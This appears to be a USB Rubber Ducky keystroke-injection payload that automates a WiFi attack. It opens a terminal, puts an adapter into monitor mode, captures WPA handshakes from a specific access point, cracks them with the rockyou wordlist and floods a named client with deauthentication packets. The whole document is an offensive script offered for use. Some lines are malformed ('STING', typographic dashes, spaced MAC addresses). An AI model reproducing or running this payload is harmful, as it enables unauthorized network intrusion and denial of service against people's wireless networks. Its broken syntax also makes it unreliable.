# Rubberducky-Payloads-Script

DELAY 6000
ALT F2
DELAY 4000
STRING qterminal
DELAY 1000
ENTER
DELAY 6000
STRING cd Desktop
DELAY 1000
ENTER
DELAY 1000
STING sudo screen
DELAY 1000
ENTER
DELAY 1000
STRING sudo iwconfig
DELAY 1000
ENTER
DELAY 1000
STRING sudo airmon-ng start wlan1
DELAY 1000
ENTER
DELAY 1000
STRING sudo iwconfig wlan1mon
DELAY 1000
ENTER
DELAY 1000
STRING sudo airmon-ng start wlan1mon
DELAY 1000
ENTER
DELAY 1000
STRING sudo airodump-ng wlan1mon
DELAY 1000
ENTER
DELAY 6000
CTRL
STRING c
DELAY 1000
STRING sudo besside-ng -b E2 : 46 : 35 : 39 : FE : 7F wlan1mon
DELAY 10000
ENTER
DELAY 1000
STRING sudo aircrack-ng -w rockyou.txt wpa.cap
DELAY 1000
ENTER
DELAY 1000
STRING sudo airodump-ng –channel 5 –bssid E2 : 46 : 35 : 39 : FE : 7F wlan1mon
DELAY 10000
ENTER
DELAY 6000
STRING sudo aireplay-ng -–ignore -negative-one -–deauth 20000 –a E2 : 46 : 35 : 39 : FE : 7F  –c 30 : 24 : 32 : 69 : E2 : 0E wlan1mon
DELAY 1000
ENTER
DELAY 20000
CTRL 
STRING c
